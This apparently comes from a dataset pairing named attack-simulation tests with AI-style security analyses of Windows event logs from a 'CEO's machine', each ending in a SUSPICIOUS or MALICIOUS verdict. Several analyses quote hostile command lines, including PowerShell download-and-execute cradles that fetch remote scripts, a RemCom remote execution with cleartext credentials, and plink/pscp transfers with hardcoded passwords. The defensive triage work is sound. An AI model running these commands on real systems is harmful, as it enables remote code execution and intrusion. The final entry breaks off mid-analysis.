3. **Microsoft Edge Update Activity:**
   - The logs show extensive execution of `MicrosoftEdgeUpdate.exe` and associated components. While this might generally be normal for performing application updates, the presence of Edge Update in temporary directories and frequent executions might warrant further examination to ensure it matches legitimate update behavior and versions.

4. **Use of Command-line Tools:**
   - Commands like `whoami` and `hostname` are executed within a short timeframe. These are typically benign but can be used by attackers to gather system information or to test system privileges and user context.

5. **Kernel Time Changes:**
   - The logs reflect Kernel time clock adjustments (`EventID` 4616), which is not suspicious by itself but should be checked for synchronization with a legitimate time source.

Based on the analysis of these logs, the use of `sc.exe` to alter service permissions, combined with rapid and potentially unnecessary executions of system utilities like `wevtutil`, raises concern about potential unauthorized system modifications or privilege escalation attempts.

### Assessment and Recommendation:

- **Resolution:** **SUSPICIOUS**
  - The current findings suggest activities that require further investigation due to potential abuse of system utilities and privilege settings on a high-value target machine (CEO's machine). While there's no definitive proof of a compromise, there are indicators that hint at possible misuse or permission escalation attempts.

### Steps to Proceed:

1. **Investigate `sc.exe` Usage:**
   - Determine if there is a legitimate reason for altering the service permissions and corroborate with system management policies or user requests.

2. **Review User Activities:**
   - Check for any authorized activities from `SERVER002\admin_test` that correspond with the logged times.

3. **Conduct Threat Hunting:**
   - Use threat detection tools to search for any IOCs (Indicators of Compromise) related to privilege escalation or manipulation of services and logs on the machine.

4. **Verify Application Updates:**
   - Ensure the Microsoft Edge updates align with legitimate update patterns, including timestamps and update servers.

5. **Comprehensive System Audit:**
   - Expand the audit to include system integrity checks, focusing on log tampering or unauthorized access attempts, to ensure no incidents were overlooked. 

In conclusion, further examination will help ascertain whether this activity was malicious or benign administrative endeavor. Immediate containment steps could be considered while detailed investigation proceeds, depending on the context and the organizational security posture."
Headless Chrome code execution via VBA,"### Detailed Analysis of the Logs

#### Anomalous Behavior

Upon analyzing the provided Windows event logs, the following points of concern were identified:

1. **PowerShell Activity:**
   - The logs show an invocation of PowerShell with the following command:
     ```
     powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     IEX (iwr ""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1"" -UseBasicParsing)
     Invoke-script -macroFile ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.002\\src\\chromeexec-macrocode.txt"" -officeProduct ""Word"" -sub ""ExecChrome""}
     ```
   - This command downloads and executes a script from a suspicious URL using `Invoke-Expression (IEX)` and `Invoke-Script`. This usage is often associated with malicious activities, as it can execute arbitrary code fetched from external sources.

2. **Process Creation:**
   - There is a creation of multiple processes using system executables like `HOSTNAME.EXE`, `whoami.exe`, and the PowerShell process itself during the same timeframe.
   - The usage of `wevtutil.exe` by a non-system user can be indicative of log tampering or clearing activities, commonly seen post-compromise to cover tracks.

3. **Sysmon Logs:**
   - Multiple entries for process creations by PowerShell indicate execution of potentially harmful scripts. The presence of unusual command-line arguments with PowerShell is suspicious.
   - Resources from external URLs were downloaded which indicates a security breach as downloading scripts from unknown sources is a common tactic for malware delivery and execution.

4. **Edge Update Executables:**
   - A variety of Edge Update activities are logged. While updating processes are common, the extensive use of different EdgeUpdate executables within a short period can be suspicious if it mimics legitimate update processes to disguise malicious activities.

#### Indicators of Malicious Activity or Compromise

- **Suspicious PowerShell Execution:** The execution of a PowerShell script from a remote source, particularly from a non-corporate URL, strongly indicates a compromised system or an ongoing intrusion attempt.
- **Potential Log Tampering:** The utilization of `wevtutil.exe`, possibly to manipulate log data, indicates an attempt to hinder forensic investigation.

### Assessment and Resolution

Based on the analysis of these logs, the situation appears as follows:

- **Threat/Risk:** There is a high likelihood that the system has been compromised due to the execution of scripts from an external, non-trusted source. The observed behavior aligns with commonly known patterns of initial access and execution phases in cyber attacks.
- **Guidance on How to Proceed:**
  - **Immediate Isolation:** The host should be isolated from the network to prevent further spread of potential threats.
  - **Thorough Forensic Analysis:** Detailed forensic analysis should be conducted on the affected system to understand the full scope of compromise.
  - **Credential Review:** Review and possibly reset credentials used on the system as they may be compromised.
  - **Monitor Network Traffic:** Closely monitor network traffic for any unauthorized data exfiltration attempts.
  - **Security Policy Update:** Review and update security policies, particularly those concerning script execution and external downloads.

**Final Resolution: MALICIOUS**

The logs contain clear indicators of malicious activity, warranting immediate action to mitigate the threat and carry out a comprehensive investigation."
Command prompt writing script to file then executes it,"### Analysis of Logs

1. **Security Log Analysis**:
   - Both events with EventID 4616 pertain to changes in the system time. The changes are executed by svchost.exe under the LOCAL SERVICE account. Although such changes can be legitimate, they might also indicate tampering, especially if done without clear administrative approval.

2. **Application Log Analysis**:
   - The ""edgeupdate"" service seemingly stopped twice in quick succession. This quick stopping and starting could indicate an issue with the service or perhaps an unintentional service failure. There is also a log from Microsoft-Windows-Security-SPP indicating an update related to RulesEngine, which is standard and not inherently suspicious.

3. **Sysmon Log Analysis**:
   - There are several process creations related to Microsoft Edge Update. These activities likely represent Edge attempting to update itself. The processes for MicrosoftEdgeUpdateSetup.exe, MicrosoftEdgeUpdate.exe, and other related executables are recorded. These include typical installation and update processes which are not inherently suspicious.
   - Noticeable event with a command execution `cmd.exe /c`, which writes a VBScript to fetch the current user with `whoami`. This behavior can be seen in more stealthy observance scripts and warrants reconsideration if not accounted for in regular system operations.
   - There are repeated executions of `whoami.exe` and `wscript.exe` related to temp locations (`fileTest.vbs`), which could indicate suspicious behavior, especially in this sequence with temporary directories and script execution being involved.

4. **System Log Analysis**:
   - Additional time change events recorded here align with the Security logs above. This cross-confirmation improves the credibility of a benign time synchronization process rather than manual tampering.

5. **Windows PowerShell Log Analysis**:
   - No logs provided for review here.
   
### Assessment & Conclusion

- **Suspicious Activity**: The recurring `whoami.exe` commands and the creation and execution of scripts within the `Temp` directory suggest unusual behavior possibly related to malicious reconnaissance or preparation for further compromise. While this activity alone isn't certain to be malicious, it is unusual and warrants further investigation.
  
- **Time Changes**: Though time changes can be leveraged in attacks to circumvent certain time-based logs, without additional corroborating evidence of ill intent such as unauthorized data access or modifications, these changes appear benign in isolation.

### Recommendation

**Resolution:** **SUSPICIOUS**

- **Next Steps**:
  - Investigate the reasons for script creation and execution in the `Temp` directory. Verify if these activities were tied to any legitimate user actions or system processes.
  - Review the environment for any evidence of privilege escalation or lateral movement that could indicate the scripts/executions were part of a larger attack.
  - Enquire with IT or system administration if recent updates or maintenance could trigger such behaviors (especially involving Edge updates).
  - Ensure endpoint protection and monitoring techniques are up-to-date to catch any potential future misuse or illusion towards exploitation.
  
Continued monitoring and correlation of similar events in future log collections may help zero in on any continuing suspect patterns of activity."
WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique,"Upon reviewing the provided log entries from various sources, including Sysmon, PowerShell, Application, System, and Security logs, a few key points and potential indicators of malicious activity are identified:

### Analysis of Logs:

1. **Sysmon Logs:**
   - The sequence of events shows the repeated execution of processes like `wevtutil.exe` and `conhost.exe`. However, these executables are legitimate Windows processes.
   - The process execution `wevtutil.exe` is often used for managing event logs, but frequent invocation in a short time span might indicate log tampering or clearing activities.
   - A PowerShell script was executed using `powershell.exe` with the following command line:
     ```plaintext
     ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')}
     ```
     This command downloads and executes a script from an external URL, which is a known pattern of malicious activity called ""Living off the Land"" techniques. The downloaded script name also suggests system manipulation.
   - `HOSTNAME.EXE` and `whoami.exe` were executed. While they are standard utilities for obtaining system and user information, in context with the PowerShell usage, they might indicate reconnaissance activity by an intruder.
   
2. **PowerShell Logs:**
   - A PowerShell instance executed a potentially malicious script downloaded from GitHub, as mentioned above. This is highly indicative of suspicious and potentially malicious behavior.

3. **Application Logs:**
   - Security related applications (e.g., Windows Defender) are shown as running, which indicates some level of protection is active on the system.
   
4. **System Logs:**
   - Logs show time synchronization activities involving `svchost.exe`, which is a common process coupled with Windows services. This activity appears typical and not directly suspicious on its own.
   
5. **Security Logs:**
   - Time alteration logs reflecting changes in system time can sometimes indicate attempts to cover tracks by an attacker, although exact detection of tampering is hard without comparative analysis.

### Assessment and Findings:

- The use of PowerShell to invoke a remote script download and execution is suspicious and a strong indicator of malicious activity. This type of behavior often forms part of an attack chain where attackers use legitimate tools to bypass defenses.
- The presence of repeated executions of `wevtutil.exe` might suggest attempts to clear logs or alter them, which can be an indicator of log tampering by an attacker attempting to hide their tracks.

### Resolution:

Given the behavior found in the logs, particularly the execution of PowerShell scripts from external sources, it is concluded that the observed activity is **MALICIOUS**. Further investigation is required to confirm the nature and impact of this activity on the system and to ensure that any compromise is fully contained and remediated.

Application uninstall using WMIC,"Based on the investigation of the provided Windows event logs from the CEO's machine, I'll provide an analysis of the suspicious activities detected:

### Detailed Analysis:

1. **PowerShell and Sysmon Logs:**
   - **Powershell.exe Execution:** The presence of PowerShell execution (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) by the user `SERVER002\admin_test` is observed. Although PowerShell can be used legitimately by administrators for various tasks, its execution can also indicate potential unauthorized activity, especially without detailed command-line arguments showing the executed scripts or commands.
   
2. **Suspicious Commands and WMIC Usage:**
   - **`wevtutil.exe` Activity:** There are multiple invocations of `wevtutil.exe`, which is a utility for managing event logs. This could indicate potential tampering or cleansing of event logs, a common practice to hide malicious activities.
   
   - **CMD and WMIC Execution:** The logs show `cmd.exe` executing a command to uninstall a product matching ""Tightvnc%"", a remote desktop software, using a WMIC command. This behavior could be seen as suspicious, potentially indicating the removal of software used for remote access or monitoring. The command is run by the same `SERVER002\admin_test` user, and the integrity level shown is ""High"", suggesting elevated privileges.

3. **User and Process Activity:**
   - **User Activity by `admin_test`:** The user `SERVER002\admin_test` is executing a variety of system utilities and commands: `HOSTNAME.EXE`, `whoami.exe`, along with potentially suspicious use of cmd.exe to execute WMIC commands.
   
4. **EdgeInstaller Events:**
   - The logs also include events related to the Microsoft Edge installer/updater executed by `NT AUTHORITY\SYSTEM`. These activities are part of regular system updates, assuming the hashes and filenames are legitimate. However, their relevance to potential malicious activities mentioned above seems minimal based on the current context.

5. **Application Log:**
   - **MsiInstaller Activity:** The logs show the installation of Microsoft Update Health Tools and a Windows systems update. These MSI installations are normal if coming from legitimate updates but should be verified against any suspicious installation times or sources.

### Assessment of Situation:

- The repeated and rapid invocation of system utilities such as `wevtutil.exe`, `wmic.exe`, and the presence of PowerShell executions indicate behavior worth further investigation, particularly given the context of potentially concealing or altering logs.
- The command-line usage to uninstall TightVNC remotely without much context or logs indicating user context or explicit admin activities suggests a possible unauthorized system alteration.

### Resolution: **SUSPICIOUS**

Given the potential risks identified with the unusual use of administrative tools and commands coupled with limited information on whether these actions were sanctioned, this activity is classified as ""SUSPICIOUS"". Further investigation is required to determine the legitimacy of these activities.

Cobalt Strike post-exploitation pipe (before 4.2),"Based on the provided Sysmon, Application, Security event logs, I have conducted a detailed analysis for any indicators of malicious activity:

### Analysis:

1. **PowerShell Execution (Sysmon EventID 1, 5):**
   - PowerShell was executed multiple times using accounts with high privileges (`SERVER002\\admin_test`). While PowerShell usage can be legitimate, it is often used by attackers for exploration and exploitation given its powerful capabilities.
   - No detailed command-line arguments provided which could give us more context on the specific commands executed, but frequent execution without a clear purpose might demand further exploration.
  
2. **Command Line Utility (Sysmon EventID 1, 5):**
   - We observed several executions of `wevtutil.exe`, a Windows tool that manipulates event logs, under user `SERVER002\\admin_test`. This tool can be used to covertly clear event logs or export them. While we didn't observe explicit commands showing log clearing, the repeated use of this tool is suspicious and may suggest obfuscation activities.
  
3. **Custom Executables (Sysmon EventID 1, 5):**
   - Processes like `namedpipes_executor.exe`, `namedpipes_server.exe`, and `namedpipes_client.exe` have been executed. These executables, located in a temporary directory, raise concerns as they match patterns for an intermediary step in data exfiltration or lateral movement via named pipes.
   - These files also do not belong to standard Windows executables and might indicate custom tools, potentially malicious without confirmation of being part of an internal legitimate operation.

4. **Security Privileges (Security EventID 4672):**
   - The user `admin_test` was granted several high-level privileges (`SeDebugPrivilege`, `SeBackupPrivilege`, and others). This gain is standard for administrative activities, yet if the credentials have been compromised, these privileges pose significant risk.
 
5. **Logons (Security EventID 4624):**
   - Multiple logon entries for `admin_test` are observed. Logon Type 3 suggests network logons, which may indicate remote access if combined with other suspicious indicators.

6. **Microsoft Edge Update Events:**
   - Several Microsoft Edge updates and related services are logged, reflecting legitimate update behavior. Thus, these are not considered suspicious.

7. **CMD Execution:**
   - There is evidence of CMD execution linked to potentially suspicious executables. The command `cmd.exe` being used to launch applications located in temporary directories appears irregular for standard operations.

### Assessment:
The behavior noted in the logs is concerning, primarily due to the execution of potentially custom, unverified executables and the use of administrative utilities with powerful capabilities across the system. The logs reflect potential preparation or execution of a lateral movement, data exfiltration activities, or malicious investigation.

### Resolution:
**SUSPICIOUS**

### Guidance:
1. Conduct thorough review and validation of executables `namedpipes_executor`, `namedpipes_client`, and `namedpipes_server` found in temporary files directories.
2. Investigate the exact command-line execution of PowerShell and `wevtutil` for unauthorized activity.
3. Cross-reference the observed user account activity (`admin_test`) against daily expected operations or tasks to verify legitimacy.
4. Consider implementing tighter PowerShell logging policies and commands scrutiny.
5. Strengthen audit trails for sensitive utilities and admin account activities on `SERVER002`.

Further examination through forensic techniques is recommended to verify if these suspicions align with potentially malicious activities or authorized usage by IT/Development teams."
Run BloodHound from local disk,"Upon analyzing the provided logs, several events stand out and indicate potentially suspicious activity:

1. **Multiple PowerShell Executions**:
   - There are multiple instances of PowerShell being executed: notably at `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` with the CommandLine indicating the execution of a script located at `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script.ps1`. This script attempts to invoke another script with exception handling which could be used to mask malicious behavior. The PowerShell command contains paths that utilize the Temp directory, a common behavior for suspicious activity.

2. **Use of `wevtutil.exe`**:
   - `wevtutil.exe` is used frequently and notably executed by the `SERVER002\admin_test` user. This tool is typically used for managing event logs, and its usage might indicate an attempt to clear or export logs to hide traces of malicious activity.

3. **High Integrity Level Processes**:
   - The logs show several processes running at a high integrity level under `SERVER002\admin_test`, indicating administrative privileges which can be suspicious, especially when associated with PowerShell scripts and `wevtutil.exe`.

4. **Exporting of Sysmon Logs**:
   - The command `""C:\\Windows\\system32\\wevtutil.exe\"" epl Microsoft-Windows-Sysmon/Operational C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\TempLog.evtx""` is observed, indicating the export of Sysmon logs. This could be a sign of someone trying to analyze or tamper with the logs externally.

5. **Suspicious File Paths**:
   - PowerShell scripts and `wevtutil.exe` actions involve file paths (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\..`) that are indicative of potentially obfuscated paths.

6. **Limited Parent Process Information in PowerShell Execution**:
   - The PowerShell execution events lack a clearly defined parent process, commonly associated with attempts to evade detection.

7. **Powershell’s use of Try-Catch and Start-Sleep**:
   - The command attempts to import a module and contains logic to handle exceptions and delay execution indicating more sophistication, commonly seen in obfuscated or illicit scripts.

Based on the analysis, these activities justify further investigation into the origin and purpose of the PowerShell scripts, the reason behind the export and potential clearance of logs, and the entities involved in executing these commands. The combination of potentially malicious scripts, administrative-level activity, and log manipulation are strong indicators of suspicious activity.

**Recommendation**:
- Investigate the origins and contents of the `script.ps1` file executed by PowerShell.
- Review user activities associated with the `SERVER002\admin_test` account to understand context and legitimacy.
- Inspect the exported or manipulated event logs to understand what might have been altered or attempted to be hidden.
- Validate the intentions behind utilizing `wevtutil.exe` by the admin user, particularly in relation to exporting logs.

**Resolution**:
SUSPICIOUS - The combination of observed actions, particularly involving PowerShell and event log utilities under administrative contexts, warrant deeper investigation."
Office launching .bat file from AppData,"Upon analyzing the provided Windows event logs, several points of interest suggest potential malicious activities:

1. **PowerShell Execution with External Script**: There are multiple PowerShell events where scripts are executed from an external URL. The command:
   ```powershell
   powershell.exe & { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr ""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1"" -UseBasicParsing) }
   ```
   This indicates that a PowerShell script is being fetched and executed from a remote source. The use of `Invoke-Expression` (IEX) with `iwr` (Invoke-WebRequest) to directly execute code from the internet is a well-known technique used in script-based attacks.

2. **Suspicious Command Line Activities**:
   - The script sets a macro code to write a batch file (`ardata.bat`) that contains `calc.exe` and attempts to execute it via shell. This is suspicious because `calc.exe` is often used as a benign payload in exploitation chains to test execution paths or to mask malicious activities.
   - The creation and execution of scripts and batch files suggest an intent to escalate activities potentially malicious or exploitative in nature.

3. **Process Execution from High-Integrity Accounts**: 
   - There are several instances where processes such as `powershell.exe`, `hostname.exe`, and `whoami.exe` are executed with high integrity levels. While these activities alone are not uncommon, the context of PowerShell downloading and executing scripts and the intent to switch context or verify user information (`whoami.exe`) adds to the suspicious narrative.

4. **Wevtutil Usage**: 
   - The `wevtutil.exe` tool appears in a sequence of executions. Although `wevtutil` is a legitimate utility, it is sometimes used by attackers for activities such as clearing event logs to erase tracks.

### Assessment and Recommendation:
- **Assessment**: The execution of PowerShell scripts directly from the internet suggests a high risk of compromise. Combined with suspicious command-line actions and utility usage, there is substantial evidence pointing towards potentially malicious activity targeting or utilizing the CEO's machine.
  
- **Threats and Risks Identified**:
  - Capability for arbitrary code execution via downloaded scripts.
  - Potential for privilege escalation and lateral movement within the network.
  - Possibility of persistence mechanisms being established.

- **Guidance on Action**:
  - Immediately isolate the CEO's machine from the network to prevent further potential malicious activities or data leaks.
  - Perform a comprehensive forensic analysis on the machine to determine the extent of compromise.
  - Review network and endpoint security policies to ensure restrictions on PowerShell script executions from remote sources, and monitor other devices for similar activities.

**Final Resolution: MALICIOUS** - The presence of remote script execution via PowerShell and indications of potentially destructive activities signify a breach or active compromise that requires immediate attention."
Use RemCom to execute a command on a remote host,"Upon reviewing the provided Sysmon logs, several activities are noted which raise concerns about the potential for malicious behavior:

1. **Suspicious Use of PowerShell and Wevtutil**: The logs show the execution of `powershell.exe` followed by `wevtutil.exe`. While `wevtutil.exe` is a legitimate Windows utility used for managing event logs, its invocation immediately after PowerShell is atypical in regular operations and might be indicative of someone attempting to clear event logs or tamper with event logging.

2. **Execution of RemCom**: A particularly alarming sequence involves the execution of `remcom.exe`, a tool often used for remote command execution. The command line used (`remcom.exe \\\\localhost /user:Administrator /pwd:P@ssw0rd1 cmd.exe`) suggests an attempt to execute commands with administrative privileges on the local machine. The use of cleartext credentials is especially concerning and indicative of unsanctioned activity.

3. **Use of High Integrity Level**: Several processes, including `cmd.exe` and `whoami.exe`, are executed with a high integrity level, implying elevated privileges. Although the use of `whoami.exe` itself isn't malicious, in conjunction with other suspicious activities, it might indicate privilege escalation or reconnaissance efforts.

4. **Command Line Arguments and Locations**: The command lines for various processes, especially `cmd.exe`'s usage to execute `remcom.exe`, and the use of paths within `C:\Users\ADMIN_~1\AppData\Local\Temp\`, suggest an effort to run potentially unauthorized commands.

5. **Presence of Unusual Files**: Execution of unrecognized or suspicious binaries, like `ProcComs.bin`, within temporary directories is another red flag. These files could potentially be part of custom scripts or tools for malicious activities.

### Assessment

The sequence of events in these logs strongly suggests malicious activity. The combination of PowerShell usage, what appears to be an attempt to manipulate logs with `wevtutil.exe`, remote command execution through `remcom.exe` using administrator credentials, coupled with high integrity level processes, indicates a high risk of compromise.

### Conclusion

The activity logged is categorized as **MALICIOUS** due to:
- The use of credentials with `remcom.exe`.
- The sequence of operations which suggest attempts to escalate privileges and potentially execute unauthorized remote commands.
- Use of tools and processes commonly involved in post-exploitation scenarios.

### Recommendation

Immediate actions should include:
- An in-depth forensic investigation of the affected system.
- A review and update of credential management and password policies, ensuring no credentials are exposed or weak.
- Disabling or uninstalling unauthorized software and tools.
- Implementing stricter monitoring and logging policies on high-value assets and accounts.
- Consider isolating or segmenting compromised systems from the network until a detailed investigation and remediation are completed."
Execute PowerShell script via Word DDE,"### Detailed Log Analysis

1. **Application Log:**
   - The log entries show the EdgeUpdate service stopping twice in quick succession. This could be indicative of an update process or a service restart but is not inherently suspicious on its own.

2. **Sysmon Log:**
   - **Event ID 5 (Process Termination):** 
     - Multiple entries for `wevtutil.exe` and `conhost.exe` under the user `SERVER002\admin_test`, which are typical administrative utilities and console host applications respectively. Their repeated execution could be part of a routine or automated script, but without command-line arguments and context, it doesn't appear overtly malicious.
     - The rapid successive creation of `wevtutil.exe` processes could indicate log querying or clearing, which requires further context to evaluate as suspicious.

   - **Event ID 1 (Process Creation):**
     - Execution of `hostname.exe` and `whoami.exe` similarly points to common administrative tasks, possibly gathering system information.
     - Execution of `cmd.exe` with the command line `""/c start \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.002\\bin\\DDE_Document.docx\""""` stands out as it references a document that presumably executes through `cmd.exe`. This could signal a potential attempt to use a DDE (Dynamic Data Exchange) exploit or load of an external document, which can be suspicious.

3. **Security Log:**
   - **Event ID 5379:** Multiple failed attempts to retrieve credentials using the process associated with a SYSTEM account, targeting functionalities like `MicrosoftAccount` and `WindowsLive`. This indicates possible credential scraping or attempts to access accounts, raising a concern.

4. **System Log:**
   - Adjustments and synchronization of system time are noted but do not reveal security implications directly without suspicious context or manipulation alerts.

### Assessment of Overall Situation

- **Suspicious Behavior:**
  - The rapid execution and termination of high-integrity processes such as `wevtutil.exe`, which might indicate log manipulation.
  - The `cmd.exe` execution leading to a potential document exploit through a temp path.
  - Security log entries indicating attempts to access sensitive credential data, associated with the SYSTEM user, are particularly concerning.

### Conclusions and Recommendations

- **Resolution: SUSPICIOUS**
  - There are elements of potentially malicious behavior, particularly around the use of `cmd.exe` to execute a document and multiple failed credential access attempts. However, without additional context or confirmed malicious payloads, it can't be classified as definitively malicious.
  
- **Guidance:**
  - Further investigation into the processes, especially around `cmd.exe` usage and any corresponding network activities or additional logs during that time.
  - Verification and monitoring for unauthorized access attempts or exfiltration, particularly relating to the SYSTEM account.
  - Evaluate `wevtutil.exe` activities to ensure there was no log tampering.
  
Follow up with detailed scans and potential isolation of the host to confirm security and integrity."
WMI Execute Local Process,"During the investigation of the provided Windows event logs associated with the CEO's machine, certain activities stand out that warrant further examination. Below is a detailed analysis based on the log entries:

1. **Repeated Execution of System Utilities**:
    - Multiple calls to `whoami.exe`, `cmd.exe`, and `wmic.exe` are noted. These utilities are often used by adversaries in the enumeration and execution of commands for system information, as well as for launching other processes.
    - The `wmic` command was used with `process call create` to initiate `notepad.exe`, which is a technique commonly used to execute processes in a potentially stealthy manner.

2. **Usage of `wevtutil.exe`**:
    - `wevtutil.exe` was invoked several times in quick succession. This utility is typically used for managing event logs. While it can be used for legitimate administrative tasks, frequent and automated invocations can potentially indicate log tampering or clearing to cover tracks.

3. **High Integrity Level Executions**:
    - Multiple processes, like `cmd.exe` and `whoami.exe`, executed under high integrity levels by the user `SERVER002\admin_test`. This suggests elevated permissions, characteristic of activities aligned with privilege escalation or establishing persistence.

4. **Execution of EdgeUpdate**:
    - The installation processes for Microsoft Edge were logged. Initially, this may seem legitimate; however, it's essential to ensure these installations or updates were expected and authorized, as software installers can be leveraged to introduce malicious payloads.

5. **Absence of Security and System Detection Entries**:
    - There are no security-related events or system logs. This absence could either indicate a monitoring configuration issue or deliberate log clearance, which is itself suspicious.

**Assessment**: The activities recorded, particularly the execution pattern of command-line utilities for process creation and potential log viewing or clearing, indicate behavior that is inconsistent with typical administrative operations. This raised the possibility of unauthorized access or malicious intent.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- **Immediate Actions**: Initiate an internal audit to confirm whether the actions were authorized, notably relate to the `wevtutil.exe`, `wmic`, and Edge updates. 
- **Enhanced Monitoring**: Temporarily enhance monitoring on this system for further activity, focusing on PowerShell execution and remote logins.
- **Security Review**: Investigate potential unauthorized access to `SERVER002\admin_test`, including reviewing login and access history for anomalies.
- **System Audit**: Conduct a thorough audit of installed software and system changes that align with the timestamps of these events to ensure they were legitimate and authorized.

Further investigation and corroboration with network logs or intrusion detection systems may provide additional context, helping to determine the nature of the suspicious activity more definitively."
Potentially Unwanted Applications (PUA),"Based on the provided logs, let's assess the activities and determine any indicators of malicious behavior:

1. **Application Log**:
   - The log shows Windows Defender is turned on (`SECURITY_PRODUCT_STATE_ON`). This is standard and benign activity.

2. **Security Log**:
   - No events provided. Hence, unable to determine any activity from this log.

3. **System Log**:
   - **Time Synchronization**: The time service is syncing with `time.windows.com`. This is normal behavior for time synchronization.
   - **Windows Update**: There are updates related to Microsoft Defender Antivirus being installed. This typically indicates routine updates, which are benign.

4. **Windows PowerShell Log**:
   - A PowerShell command is attempting to download a file (`http://amtso.eicar.org/PotentiallyUnwanted.exe`) and execute it. This action is suspicious as it involves:
     - Downloading a potentially unwanted program (PUP) from an external URL.
     - Attempting to execute this downloaded file.

5. **Sysmon Log**:
   - Various processes (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `MpSigStub.exe`, etc.) executed by the user `SERVER002\admin_test`. The execution of **hostname** and **whoami** is common for network or system information checks and can be benign.
   - The execution of `powershell.exe` with the command to download and execute `PotentiallyUnwanted.exe` (as seen in PowerShell log) aligns with potential malicious activity, especially considering the context and naming convention which suggests the executable's suspicious nature.

**Assessment and Resolution:**

- **Suspicious Activity**: The PowerShell activity, which involves downloading and executing a PUP from an external site, stands out as abnormal and potentially harmful. This activity requires further investigation to determine the intention, potential persistence mechanisms, and whether any actual harm occurred.
  
- **Benign Activities**: Logs related to normal system operations, such as time synchronization, routine Windows and Microsoft Defender updates, and default system commands seem appropriate and do not indicate maliciousness.

**Guidance**:
- **Investigate**: Follow up to determine how and why the PowerShell script was executed. Investigate the source and authenticity of `PotentiallyUnwanted.exe`.
- **Monitoring**: Increase monitoring for similar PowerShell activities on this and other sensitive systems.
- **Review EDR alerts**: Understand why this specific activity triggered the alert and consider adjusting alert thresholds if necessary.
- **Protect**: Ensure robust security controls are in place to prevent unauthorized script execution and downloads from non-trusted sources.

**Conclusion**: The overall resolution for the logs is **SUSPICIOUS** due to the PowerShell activity. Further investigation is necessary to confirm if it constitutes a real threat."
ESXi - Install a custom VIB on an ESXi host,"### Assessment of Windows Event Logs

Upon analysis of the provided Windows event logs from Server002, several entries indicate potentially suspicious behavior that warrants further investigation:

1. **Sysmon Events:**
   - **Use of PowerShell and cmd.exe with External Files:**
     - The Sysmon logs reveal the execution of `powershell.exe` and `cmd.exe` under the user `SERVER002\admin_test`, which are normal administrative tools. However, command-line executions using `cmd.exe` include the `pscp.exe` and `plink.exe` utilities with hardcoded credentials (`-pw pass`), transferring files (`filevibes.vib`) to a remote location (`root@file.local:/tmp`). This behavior is suspicious as it indicates unauthorized file transfer and use of insecure credentials.
     - The utilities `pscp.exe` and `plink.exe` are often used for file transfers and SSH connections, sometimes abused by threats if found outside of managed IT processes.

2. **Security Events:**
   - **Logon and Privilege Use:**
     - Security logs show various logons using the SYSTEM account with all typical privileges. While SYSTEM activities are common, verifying if this behavior correlates with known system maintenance tasks is necessary.
   - **Credential Access Event:**
     - Event ID 5379 (Credential Manager) entries displaying failed access attempts for a MicrosoftAccount token indicate possible credential harvesting attempts or misuse of credential access processes.

3. **Application Logs:**
   - Frequent Microsoft Edge Update entries, both starting and stopping, are visible. While this activity is generally benign and indicative of legitimate software updates, confirming whether these updates align with scheduled tasks or software maintenance windows is prudent.

### Conclusion

Based on the analysis, the presence of unauthorized file transfer mechanisms and hardcoded credentials in the execution of `cmd.exe` processes renders the activity suspicious. The analysis does not provide conclusive evidence of a compromise, but these activities deviate from typical expected behavior, indicating a potential misconfiguration or malicious intent, especially considering the target is the CEO's machine.

### Recommended Resolution

**Resolution:** **SUSPICIOUS**

### Guidance on How to Proceed

1. **Immediate Actions:**
   - **Isolate the asset** to prevent any potential further unauthorized access or data exfiltration.
   - **Modify/Lockdown credentials**, especially those hardcoded in scripts or utilities.
   - **Review User Activity**: Verify with `admin_test` user for the legitimacy of these actions.

2. **Further Investigation:**
   - Conduct a thorough investigation into the origin and purpose of `pscp.exe` and `plink.exe` executables found in the execution path.
   - Review network traffic logs to evaluate any unauthorized external connections.
   - Perform a full antivirus and anti-malware scan on the machine to ensure no malicious payloads have been deployed.

3. **Preventative Measures:**
   - Implement security best practices by disabling unnecessary PowerShell and cmd.exe access for non-administrative tasks.
   - Enforce stronger password policies and use a password manager to prevent the reuse of passwords in scripts.
   - Ensure that all software updates follow organizational patching policies with proper change management documentation.

By conducting these next steps, you can better ascertain the nature of these activities and reinforce the security posture of your infrastructure."
WMI Execute Remote Process,"Based on the analysis of the provided log entries, several indicators do raise concerns:

1. **Time Manipulation Events**: There are events indicating the system time was changed by the `svchost.exe` process. Frequent or unauthorized time changes are often used to obfuscate activity or evade detection mechanisms that rely on timestamps.

2. **Privilege Escalation Events**: The user account `admin_test` was granted several high-level privileges (Event ID 4672), which include `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. These privileges, especially when elevated suddenly, can be indicative of privilege escalation, a common technique used by attackers to gain control over a system.

3. **Suspicious Logon Events**: There are logon attempts using `NTLM` from a workstation named `DESKTOP-3HL5B2P`. Anomalies with NTLM network logons, especially if unexpected or sourced from unrecognized machines, could suggest credential misuse.

4. **Multiple Failed Logons**: There are multiple failed login attempts (Event ID 4625) for the `Administrator` account, executed by `WMIC.exe`, which is being run by `admin_test`. This suggests possible brute force attempts or an attempt to use a compromised account.

5. **Command Line Execution with Embedded Credentials**: The logs show a `cmd.exe` process executing `WMIC` commands with explicit username and password details in the command line. This is highly atypical for legitimate usage and indicates a significant security risk. Such patterns are often related to scripts or malware attempting automated control.

6. **Process Execution from Suspicious Contexts**: Execution of Windows native binaries like `whoami.exe`, `hostname.exe`, and notably `wevtutil.exe` by the `admin_test` user without clear context can be indicative of reconnaissance or system enumeration activities.

